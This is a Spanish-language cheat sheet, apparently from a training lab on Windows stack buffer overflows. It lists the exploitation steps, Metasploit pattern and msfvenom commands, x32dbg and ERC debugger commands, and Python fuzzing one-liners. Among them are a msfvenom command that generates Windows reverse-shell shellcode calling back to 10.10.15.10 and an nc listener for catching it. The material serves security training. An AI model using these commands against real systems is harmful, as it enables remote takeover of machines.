La hoja de trucos es una referencia de comandos útil para este módulo.

## Pasos para solucionar un desbordamiento del búfer

1. Parámetros de fuzzing
2. Control de EIP
3. Identificando malos personajes
4. Cómo encontrar una instrucción de devolución
5. Saltar a Shellcode

## Comandos

| Dominio                                                                                           | Descripción                                                    |
| ------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |
| **General**                                                                                       |                                                                |
| `xfreerdp /v:<target IP address> /u:htb-student /p:<password>`                                    | RDP a máquina virtual de Windows                               |
| `/usr/bin/msf-pattern_create -l 5000`                                                             | Crear patrón                                                   |
| `/usr/bin/msf-pattern_offset -q 31684630`                                                         | Encontrar el desplazamiento del patrón                         |
| `netstat -a \|findstr LISTEN`                                                                     | Lista de puertos de escucha en una máquina Windows             |
| `.\nc.exe 127.0.0.1 8888`                                                                         | Interactuar con el puerto                                      |
| `msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'`                                  | Generar Shellcode Privesc local                                |
| `msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python' -b '\x00\0x0a'` | Generar Shellcode de Shell inverso                             |
| `nc -lvnp 1234`                                                                                   | Escuche el shell inverso                                       |
| **x32dbg**                                                                                        |                                                                |
| `F3`                                                                                              | Abrir archivo                                                  |
| `alt+A`                                                                                           | Adjuntar a un proceso                                          |
| `alt+L`                                                                                           | Ir a la pestaña Registros                                      |
| `alt+E`                                                                                           | Ir a la pestaña Símbolos                                       |
| `ctrl+f`                                                                                          | Buscar instrucción                                             |
| `ctrl+b`                                                                                          | Buscar patrón                                                  |
| `Search For>All Modules>Command`                                                                  | Busque instrucciones en todos los módulos cargados             |
| `Search For>All Modules>Pattern`                                                                  | Buscar todos los módulos cargados por patrón                   |
| **ERC**                                                                                           |                                                                |
| `ERC --config SetWorkingDirectory C:\Users\htb-student\Desktop\`                                  | Configurar directorio de trabajo                               |
| `ERC --pattern c 5000`                                                                            | Crear patrón                                                   |
| `ERC --pattern o 1hF0`                                                                            | Encontrar el desplazamiento del patrón                         |
| `ERC --bytearray`                                                                                 | Generar matriz de bytes de todos los caracteres                |
| `ERC --bytearray -bytes 0x00`                                                                     | Generar matriz de bytes excluyendo ciertos bytes               |
| `ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin`                             | Comparar bytes en la memoria con un archivo de matriz de bytes |
| `ERC --ModuleInfo`                                                                                | Lista de módulos cargados y sus protecciones de memoria        |
| **Python**                                                                                        |                                                                |
| `python -c "print('A'*10000)"`                                                                    | Carga útil de impresión difusa                                 |
| `python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"`                                        | Escribir la carga útil de fuzzing en un archivo                |
| `breakpoint()`                                                                                    | Agregar un punto de interrupción al exploit de Python          |
| `c`                                                                                               | Continuar desde el punto de interrupción                       |
